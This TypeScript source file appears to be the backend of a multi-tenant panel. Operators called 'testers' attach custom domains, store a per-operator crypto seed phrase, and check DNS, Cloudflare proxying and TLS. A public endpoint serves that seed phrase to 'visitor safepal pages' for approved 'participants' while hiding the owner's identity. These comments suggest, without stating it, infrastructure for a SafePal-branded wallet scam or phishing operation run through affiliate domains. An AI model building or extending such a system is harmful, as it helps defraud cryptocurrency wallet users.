// Tenant/domain and per-tester settings server functions.
// - resolveTenantByHost: public (unauthenticated) — used by participant pages
//   to look up which tester "owns" this hostname and what seed phrase to show.
// - listMyDomains / addDomain / removeDomain: for the signed-in owner (tester
//   or admin manages their own; admin sees all through listAllDomains).
// - getMySeedPhrase / setMySeedPhrase: per-tester seed phrase (stored in
//   tester_settings).

import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";
import { requestHost } from "@/lib/security";

const HOST_RE = /^[a-z0-9][a-z0-9.-]{1,253}$/;

function normalizeHost(input: string): string {
  return input.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
}

async function isAdmin(userId: string): Promise<boolean> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("user_roles")
    .select("role")
    .eq("user_id", userId)
    .eq("role", "admin")
    .maybeSingle();
  return !!data;
}

async function isTesterOrAdmin(userId: string): Promise<boolean> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("user_roles")
    .select("role")
    .eq("user_id", userId)
    .in("role", ["admin", "tester"]);
  return (data ?? []).length > 0;
}

async function seedForOwner(ownerId: string): Promise<string> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data: settings } = await supabaseAdmin
    .from("tester_settings")
    .select("seed_phrase")
    .eq("owner_id", ownerId)
    .maybeSingle();
  return (settings?.seed_phrase as string) ?? "";
}

// PUBLIC — visitor safepal pages load the tester seed via this.
// Hardened: ignores spoofed hosts, only approved participants, never returns ownerId.
export const resolveTenantByHost = createServerFn({ method: "GET" })
  .inputValidator((d: unknown) =>
    z
      .object({
        host: z.string().max(255).optional(),
        participantId: z.string().max(64).optional(),
      })
      .parse(d),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const empty = { ownerId: null as string | null, seedPhrase: "" };

    const participantId = (data.participantId ?? "").trim();
    if (participantId && /^p_[a-zA-Z0-9-]{8,64}$/.test(participantId)) {
      const { data: part } = await supabaseAdmin
        .from("participants")
        .select("owner_id, approved")
        .eq("id", participantId)
        .maybeSingle();
      const ownerId = (part?.owner_id as string | null) ?? null;
      if (ownerId && part?.approved === true) {
        return { ownerId: null, seedPhrase: await seedForOwner(ownerId) };
      }
    }

    const incoming = requestHost();
    const claimed = normalizeHost(data.host ?? "");
    if (claimed && incoming && claimed !== incoming) return empty;
    const host = incoming || claimed;
    if (!host) return empty;

    const { data: dom } = await supabaseAdmin
      .from("tenant_domains")
      .select("owner_id")
      .eq("hostname", host)
      .maybeSingle();
    if (!dom) return empty;
    return { ownerId: null, seedPhrase: await seedForOwner(dom.owner_id as string) };
  });

export const listMyDomains = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const admin = await isAdmin(context.userId);
    let query = supabaseAdmin
      .from("tenant_domains")
      .select("id, hostname, owner_id, created_at, dns_status, ssl_status, last_checked_at, last_seen_at")
      .order("created_at", { ascending: true });
    if (!admin) query = query.eq("owner_id", context.userId);
    const { data, error } = await query;
    if (error) throw new Error(error.message);
    return data ?? [];
  });

export const addDomain = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ hostname: z.string().min(3).max(255), ownerId: z.string().uuid().optional() }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const host = normalizeHost(data.hostname);
    if (!HOST_RE.test(host)) throw new Error("Invalid hostname");
    const admin = await isAdmin(context.userId);
    const owner = admin && data.ownerId ? data.ownerId : context.userId;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("tenant_domains")
      .insert({ hostname: host, owner_id: owner });
    if (error) {
      if (error.code === "23505") throw new Error("That domain is already attached (possibly to another tester)");
      throw new Error(error.message);
    }
    // Backfill owner_id for any existing participants already sitting on this host.
    await supabaseAdmin
      .from("participants")
      .update({ owner_id: owner })
      .eq("host", host)
      .is("owner_id", null);
    return { ok: true as const, hostname: host };
  });

export const removeDomain = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const admin = await isAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let q = supabaseAdmin.from("tenant_domains").delete().eq("id", data.id);
    if (!admin) q = q.eq("owner_id", context.userId);
    const { error } = await q;
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });

export const getMySeedPhrase = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data } = await supabaseAdmin
      .from("tester_settings")
      .select("seed_phrase")
      .eq("owner_id", context.userId)
      .maybeSingle();
    return { seedPhrase: (data?.seed_phrase as string) ?? "" };
  });

export const setMySeedPhrase = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ seedPhrase: z.string().max(2048) }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("tester_settings")
      .upsert({ owner_id: context.userId, seed_phrase: data.seedPhrase }, { onConflict: "owner_id" });
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });

// Admin-only: list every domain grouped with owner username for the admin panel.
export const listAllDomainsWithOwners = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isAdmin(context.userId))) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const [{ data: doms, error }, { data: profs }] = await Promise.all([
      supabaseAdmin.from("tenant_domains").select("id, hostname, owner_id, created_at").order("created_at"),
      supabaseAdmin.from("profiles").select("id, username"),
    ]);
    if (error) throw new Error(error.message);
    const nameById = new Map<string, string>((profs ?? []).map((p) => [p.id as string, (p.username as string) ?? "?"]));
    return (doms ?? []).map((d) => ({
      id: d.id as string,
      hostname: d.hostname as string,
      owner_id: d.owner_id as string,
      owner_username: nameById.get(d.owner_id as string) ?? "?",
      created_at: d.created_at as string,
    }));
  });

async function readServerPublicIp(): Promise<string> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await supabaseAdmin
    .from("app_settings")
    .select("value")
    .eq("key", "server_public_ip")
    .maybeSingle();
  const stored = (data?.value as { ip?: string } | null)?.ip;
  if (stored && stored.trim()) return stored.trim();
  const env = (process.env.SERVER_PUBLIC_IP ?? "").trim();
  return env || "0.0.0.0";
}

// Used by the "Add domain" dialog. Returns the IP configured in admin settings
// (falls back to SERVER_PUBLIC_IP env, then "0.0.0.0").
export const getServerConnectionInfo = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    return {
      ip: await readServerPublicIp(),
      panelHost: process.env.PANEL_HOST || "ilovemolly.com",
    };
  });

// Admin-only: update the server IP shown to testers when they add a domain.
export const setServerPublicIp = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ ip: z.string().trim().max(64) }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isAdmin(context.userId))) throw new Error("Forbidden");
    const ip = data.ip.trim();
    // Accept IPv4 / IPv6 / empty (to reset to default).
    if (ip && !/^[0-9a-fA-F:.]+$/.test(ip)) throw new Error("Invalid IP");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("app_settings")
      .upsert(
        { key: "server_public_ip", value: { ip }, updated_at: new Date().toISOString() },
        { onConflict: "key" },
      );
    if (error) throw new Error(error.message);
    return { ok: true as const, ip: ip || "0.0.0.0" };
  });

/** Cloudflare published IPv4 ranges (orange-cloud / proxied DNS). */
const CLOUDFLARE_IPV4_CIDRS = [
  "173.245.48.0/20",
  "103.21.244.0/22",
  "103.22.200.0/22",
  "103.31.4.0/22",
  "141.101.64.0/18",
  "108.162.192.0/18",
  "190.93.240.0/20",
  "188.114.96.0/20",
  "197.234.240.0/22",
  "198.41.128.0/17",
  "162.158.0.0/15",
  "104.16.0.0/13",
  "104.24.0.0/14",
  "172.64.0.0/13",
  "131.0.72.0/22",
];

function ipv4ToInt(ip: string): number | null {
  const parts = ip.split(".");
  if (parts.length !== 4) return null;
  let n = 0;
  for (const p of parts) {
    const o = Number(p);
    if (!Number.isInteger(o) || o < 0 || o > 255) return null;
    n = (n << 8) + o;
  }
  return n >>> 0;
}

function ipv4InCidr(ip: string, cidr: string): boolean {
  const [base, bitsRaw] = cidr.split("/");
  const bits = Number(bitsRaw);
  const ipN = ipv4ToInt(ip);
  const baseN = ipv4ToInt(base ?? "");
  if (ipN == null || baseN == null || !Number.isInteger(bits) || bits < 0 || bits > 32) {
    return false;
  }
  if (bits === 0) return true;
  const mask = (0xffffffff << (32 - bits)) >>> 0;
  return (ipN & mask) === (baseN & mask);
}

function isCloudflareIpv4(ip: string): boolean {
  return CLOUDFLARE_IPV4_CIDRS.some((c) => ipv4InCidr(ip, c));
}

// Verifies (a) DNS resolves to SERVER_PUBLIC_IP or a Cloudflare proxy IP, and
// (b) https://<host>/api/public/health returns 200 (proves TLS / Caddy).
export const checkDomainStatus = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ data, context }) => {
    if (!(await isTesterOrAdmin(context.userId))) throw new Error("Forbidden");
    const admin = await isAdmin(context.userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let q = supabaseAdmin.from("tenant_domains").select("id, hostname, owner_id").eq("id", data.id);
    if (!admin) q = q.eq("owner_id", context.userId);
    const { data: row } = await q.maybeSingle();
    if (!row) throw new Error("Not found");
    const host = row.hostname as string;
    const ipConfigured = await readServerPublicIp();
    const expectIp = ipConfigured === "0.0.0.0" ? "" : ipConfigured;

    // DNS check via Cloudflare DoH (works in Worker + Node runtimes).
    let dnsStatus: "ok" | "proxied" | "mismatch" | "pending" = "pending";
    let resolvedIps: string[] = [];
    try {
      const doh = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(host)}&type=A`, {
        headers: { accept: "application/dns-json" },
        signal: AbortSignal.timeout(5000),
      });
      const j = (await doh.json()) as { Answer?: Array<{ type: number; data: string }> };
      resolvedIps = (j.Answer ?? []).filter((a) => a.type === 1).map((a) => a.data);
      if (resolvedIps.length === 0) {
        dnsStatus = "pending";
      } else if (!expectIp) {
        dnsStatus = "ok"; // no IP configured; presume ok if resolves
      } else if (resolvedIps.includes(expectIp)) {
        dnsStatus = "ok";
      } else if (resolvedIps.some(isCloudflareIpv4)) {
        // Orange-cloud: public DNS shows Cloudflare anycast, not origin IP.
        dnsStatus = "proxied";
      } else {
        dnsStatus = "mismatch";
      }
    } catch {
      dnsStatus = "pending";
    }

    // SSL / live check.
    let sslStatus: "issued" | "pending" | "failed" = "pending";
    try {
      const probe = await fetch(`https://${host}/api/public/health`, {
        signal: AbortSignal.timeout(6000),
      });
      if (probe.ok) sslStatus = "issued";
      else sslStatus = "failed";
    } catch {
      sslStatus = "pending";
    }

    // If the site is live over HTTPS, DNS is good enough even through a CDN.
    if (sslStatus === "issued" && dnsStatus === "mismatch" && resolvedIps.length > 0) {
      dnsStatus = "proxied";
    }

    const nowIso = new Date().toISOString();
    await supabaseAdmin
      .from("tenant_domains")
      .update({ dns_status: dnsStatus, ssl_status: sslStatus, last_checked_at: nowIso })
      .eq("id", data.id);

    return {
      dns_status: dnsStatus,
      ssl_status: sslStatus,
      resolved_ips: resolvedIps,
      expected_ip: expectIp,
      last_checked_at: nowIso,
    };
  });

